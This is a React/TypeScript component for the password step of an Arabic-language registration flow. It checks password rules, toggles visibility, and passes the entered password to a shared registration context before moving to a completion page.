import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Info, Eye, EyeOff } from "lucide-react";
import { useRegistration } from "@/contexts/RegistrationContext";

const PasswordForm = () => {
  const navigate = useNavigate();
  const { updateData, sendCumulativeMessage } = useRegistration();
  const [password, setPassword] = useState<string>("");
  const [confirmPassword, setConfirmPassword] = useState<string>("");
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState<boolean>(false);

  const validatePassword = (pwd: string): boolean => {
    if (pwd.length < 8) return false;
    if (!/[A-Z]/.test(pwd)) return false;
    if (!/[a-z]/.test(pwd)) return false;
    if (!/[0-9]/.test(pwd)) return false;
    return true;
  };

  const isFormValid = (): boolean => {
    return password.trim() !== "" &&
           confirmPassword.trim() !== "" &&
           password === confirmPassword &&
           validatePassword(password);
  };

  const handleContinue = async () => {
    if (!isFormValid()) {
      alert("يرجى التأكد من صحة كلمة المرور وتطابقها مع جميع الشروط");
      return;
    }

    const newData = { password };
    updateData(newData);
    await sendCumulativeMessage(3, "كلمة المرور", newData);
    navigate("/registration-complete");
  };

  const handleBack = () => {
    navigate("/personal-info");
  };

  const handleCancel = () => {
    navigate("/");
  };

  return (
    <div className="bg-gray-100 rounded-lg shadow-sm p-8 max-w-4xl mx-auto">
      <h2 className="text-2xl font-semibold mb-2 text-right">إنشاء كلمة المرور</h2>

      <div className="space-y-6 mb-8">
        {/* قواعد كلمة المرور */}
        <div className="bg-primary/10 rounded-lg p-6 border border-primary/20">
          <div className="flex items-start gap-2 mb-4">
            <Info className="w-5 h-5 mt-0.5 flex-shrink-0 text-primary" />
            <h3 className="font-semibold text-right">قواعد إدخال كلمة المرور</h3>
          </div>
          <ul className="space-y-2 text-right text-sm text-muted-foreground">
            <li>• يجب أن تتكون كلمة المرور من 8 أحرف على الأقل</li>
            <li>• يجب أن تحتوي على حرف كبير واحد على الأقل (A-Z)</li>
            <li>• يجب أن تحتوي على حرف صغير واحد على الأقل (a-z)</li>
            <li>• يجب أن تحتوي على رقم واحد على الأقل (0-9)</li>
          </ul>
        </div>

        {/* إدخال كلمة المرور */}
        <div>
          <Label htmlFor="password" className="text-right block mb-2">
            أدخل كلمة المرور
          </Label>
          <div className="relative">
            <Input
              id="password"
              type={showPassword ? "text" : "password"}
              className="text-right bg-white pr-10"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
            >
              {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>
        </div>

        {/* إعادة إدخال كلمة المرور */}
        <div>
          <Label htmlFor="confirmPassword" className="text-right block mb-2">
            أعد إدخال كلمة المرور
          </Label>
          <div className="relative">
            <Input
              id="confirmPassword"
              type={showConfirmPassword ? "text" : "password"}
              className="text-right bg-white pr-10"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
            />
            <button
              type="button"
              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
            >
              {showConfirmPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </button>
          </div>
          {confirmPassword && password !== confirmPassword && (
            <p className="text-destructive text-xs mt-1 text-right">كلمة المرور غير متطابقة</p>
          )}
          {password && !validatePassword(password) && (
            <p className="text-destructive text-xs mt-1 text-right">كلمة المرور لا تستوفي الشروط المطلوبة</p>
          )}
        </div>
      </div>

      {/* الأزرار */}
      <div className="flex flex-col-reverse sm:flex-row sm:items-center sm:justify-between gap-3 sm:gap-4 pt-6 border-t border-border">
        <div className="flex gap-3 w-full sm:w-auto">
          <Button variant="outline" className="flex-1 sm:flex-none sm:min-w-24 h-12 sm:h-10" onClick={handleBack}>
            رجوع
          </Button>
          <Button variant="outline" className="flex-1 sm:flex-none sm:min-w-24 h-12 sm:h-10" onClick={handleCancel}>
            إلغاء
          </Button>
        </div>

        <Button
          className="w-full sm:w-auto sm:min-w-32 h-12 sm:h-10 bg-primary hover:bg-primary/90"
          onClick={handleContinue}
          disabled={!isFormValid()}
        >
          استمر
        </Button>
      </div>
    </div>
  );
};

export default PasswordForm;
